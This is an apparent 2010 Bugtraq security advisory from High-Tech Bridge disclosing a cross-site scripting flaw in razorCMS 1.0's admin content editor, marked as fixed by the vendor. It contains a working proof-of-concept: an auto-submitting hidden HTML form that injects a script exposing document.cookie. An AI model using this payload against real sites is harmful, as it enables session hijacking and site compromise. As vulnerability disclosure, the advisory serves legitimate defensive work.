
Date: Tue, 25 May 2010 19:47:59 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: XSS vulnerability in razorCMS

Vulnerability ID: HTB22376
Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_razorcms.html
Product: razorCMS
Vendor: morgan integrated systems limited
Vulnerable Version: 1.0 stable
Vendor Notification: 10 May 2010 
Vulnerability Type: XSS (Cross Site Scripting)
Status: Fixed by Vendor
Risk level: Medium 
Credit: High-Tech Bridge SA (http://www.htbridge.ch/) 

Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application. 

The vulnerability exists due to failure in the "/admin/core/admin_func.php" script to properly sanitize user-supplied input in "content" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available: 

<form action="http://example.com/admin/?action=edit&slab=home" method="post" name="main" >
	<input type="hidden" name="title" value="Home" />
	<input name="content" type="hidden" value='hello"><script>alert("2"+document.cookie)</script>' />
	<input type="hidden" name="ptitle" value="" />
	<input type="hidden" name="theme" value="theme-default" />
	<input type="hidden" name="check_sidebar" value="sidebar" />
	<input type="hidden" name="save" value="Save Content" />
</form>
<script>
document.main.submit();
</script>

Solution: Upgrade to the most recent verison

